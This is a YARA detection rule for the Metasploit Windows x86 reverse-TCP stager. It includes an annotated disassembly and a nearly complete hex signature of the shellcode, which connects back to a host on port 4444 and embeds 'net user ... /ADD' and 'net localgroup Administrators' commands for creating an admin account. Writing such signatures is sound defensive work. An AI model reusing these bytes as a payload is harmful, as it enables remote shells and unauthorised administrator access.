
    rule stager_reverse_tcp___start0___x86
    {
        meta:
            desc = "Metasploit::windows::x86::stager_reverse_tcp::__start0__"
    
        /*
            FC                   | .                    | cld
            6AEB                 | j.                   | push byte -0x15
            47                   | G                    | inc edi
            E8F9FFFFFF           | .....                | call 0x2
            60                   | `                    | pusha
            31DB                 | 1.                   | xor ebx,ebx
            8B7D3C               | .}<                  | mov edi,[ebp+0x3c]
            8B7C3D78             | .|=x                 | mov edi,[ebp+edi+0x78]
            01EF                 | ..                   | add edi,ebp
            8B5720               | .W                   | mov edx,[edi+0x20]
            01EA                 | ..                   | add edx,ebp
            8B349A               | .4.                  | mov esi,[edx+ebx*4]
            01EE                 | ..                   | add esi,ebp
            31C0                 | 1.                   | xor eax,eax
            99                   | .                    | cdq
            AC                   | .                    | lodsb
            C1CA0D               | ...                  | ror edx,0xd
            01C2                 | ..                   | add edx,eax
            84C0                 | ..                   | test al,al
            0F85F2FFFFFF         | ......               | jnz 0x22
            43                   | C                    | inc ebx
            6639CA               | f9.                  | cmp dx,cx
            0F85DBFFFFFF         | ......               | jnz 0x15
            4B                   | K                    | dec ebx
            8B4F24               | .O$                  | mov ecx,[edi+0x24]
            01E9                 | ..                   | add ecx,ebp
            668B1C59             | f..Y                 | mov bx,[ecx+ebx*2]
            8B4F1C               | .O.                  | mov ecx,[edi+0x1c]
            01E9                 | ..                   | add ecx,ebp
            032C99               | .,.                  | add ebp,[ecx+ebx*4]
            896C241C             | .l$.                 | mov [esp+0x1c],ebp
            61                   | a                    | popa
            FFE0                 | ..                   | jmp eax
            31DB                 | 1.                   | xor ebx,ebx
            648B4330             | d.C0                 | mov eax,[fs:ebx+0x30]
            8B400C               | .@.                  | mov eax,[eax+0xc]
            8B701C               | .p.                  | mov esi,[eax+0x1c]
            AD                   | .                    | lodsd
            8B6808               | .h.                  | mov ebp,[eax+0x8]
            5E                   | ^                    | pop esi
            6653                 | fS                   | push bx
            66683332             | fh32                 | push word 0x3233
            687773325F           | hws2_                | push dword 0x5f327377
            54                   | T                    | push esp
            66B97260             | f.r`                 | mov cx,0x6072
            FFD6                 | ..                   | call esi
            95                   | .                    | xchg eax,ebp
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            53                   | S                    | push ebx
            43                   | C                    | inc ebx
            53                   | S                    | push ebx
            43                   | C                    | inc ebx
            53                   | S                    | push ebx
            89E7                 | ..                   | mov edi,esp
            6681EF0802           | f....                | sub di,0x208
            57                   | W                    | push edi
            53                   | S                    | push ebx
            66B9E7DF             | f...                 | mov cx,0xdfe7
            FFD6                 | ..                   | call esi
            66B9A86F             | f..o                 | mov cx,0x6fa8
            FFD6                 | ..                   | call esi
            97                   | .                    | xchg eax,edi
            68????????           | h....                | push dword 0x100007f	; Host
            6668115C             | fh.\                 | push word 0x5c11
            6653                 | fS                   | push bx
            89E3                 | ..                   | mov ebx,esp
            6A10                 | j.                   | push byte +0x10
            53                   | S                    | push ebx
            57                   | W                    | push edi
            66B95705             | f.W.                 | mov cx,0x557
            FFD6                 | ..                   | call esi
            50                   | P                    | push eax
            B40C                 | ..                   | mov ah,0xc
            50                   | P                    | push eax
            53                   | S                    | push ebx
            57                   | W                    | push edi
            53                   | S                    | push ebx
            66B9C038             | f..8                 | mov cx,0x38c0
            FFE6                 | ..                   | jmp esi
            636D64               | cmd                  | arpl [ebp+0x64],bp
            650F885A000000       | e..Z...              | gs js 0x11d
            202F                 |  /                   | and [edi],ch
            6320                 | c                    | arpl [eax],sp
            6E                   | n                    | outsb
            650F8411000000       | e......              | gs jz 0xe0
            0F8560000000         | ..`...               | jnz 0x135
            650F8209000000       | e......              | gs jc 0xe5
            6D                   | m                    | insd
            650F8446000000       | e..F...              | gs jz 0x12a
            0F8351000000         | ..Q...               | jnc 0x13b
            6C                   | l                    | insb
            6F                   | o                    | outsd
            6970202F414444       | ip /ADD              | imul esi,[eax+0x20],dword 0x4444412f
            2026                 |  &                   | and [esi],ah
            26206E65             | & ne                 | and [es:esi+0x65],ch
            0F84FEFFFFFF         | ......               | jz 0xfd
            6C                   | l                    | insb
            6F                   | o                    | outsd
            63616C               | cal                  | arpl [ecx+0x6c],sp
            670F8249000000       | g..I...              | a16 jc 0x154
            0F8546000000         | ..F...               | jnz 0x157
            204164               |  Ad                  | and [ecx+0x64],al
            6D                   | m                    | insd
            696E6973747261       | inistra              | imul ebp,[esi+0x69],dword 0x61727473
            0F8441000000         | ..A...               | jz 0x163
            0F8241000000         | ..A...               | jc 0x169
            206D65               |  me                  | and [ebp+0x65],ch
            0F842B000000         | ..+...               | jz 0x15c
            0F8336000000         | ..6...               | jnc 0x16d
            6C                   | l                    | insb
            6F                   | o                    | outsd
            69702F41444400       | ip/ADD.              | imul esi,[eax+0x2f],dword 0x444441
        */
    
        strings:
            $a   = { fc 6a eb 47 e8 f9 ff ff ff 60 31 db 8b 7d 3c 8b 7c 3d 78 01 ef 8b 57 20 01 ea 8b 34 9a 01 ee 31 c0 99 ac c1 ca 0d 01 c2 84 c0 0f 85 f2 ff ff ff 43 66 39 ca 0f 85 db ff ff ff 4b 8b 4f 24 01 e9 66 8b 1c 59 8b 4f 1c 01 e9 03 2c 99 89 6c 24 1c 61 ff e0 31 db 64 8b 43 30 8b 40 0c 8b 70 1c ad 8b 68 08 5e 66 53 66 68 33 32 68 77 73 32 5f 54 66 b9 72 60 ff d6 95 53 53 53 53 43 53 43 53 89 e7 66 81 ef 08 02 57 53 66 b9 e7 df ff d6 66 b9 a8 6f ff d6 97 68 ?? ?? ?? ?? 66 68 11 5c 66 53 89 e3 6a 10 53 57 66 b9 57 05 ff d6 50 b4 0c 50 53 57 53 66 b9 c0 38 ff e6 63 6d 64 65 0f 88 5a 00 00 00 20 2f 63 20 6e 65 0f 84 11 00 00 00 0f 85 60 00 00 00 65 0f 82 09 00 00 00 6d 65 0f 84 46 00 00 00 0f 83 51 00 00 00 6c 6f 69 70 20 2f 41 44 44 20 26 26 20 6e 65 0f 84 fe ff ff ff 6c 6f 63 61 6c 67 0f 82 49 00 00 00 0f 85 46 00 00 00 20 41 64 6d 69 6e 69 73 74 72 61 0f 84 41 00 00 00 0f 82 41 00 00 00 20 6d 65 0f 84 2b 00 00 00 0f 83 36 00 00 00 6c 6f 69 70 2f 41 44 44 00 }
    
        condition:
            any of them
    }
    
    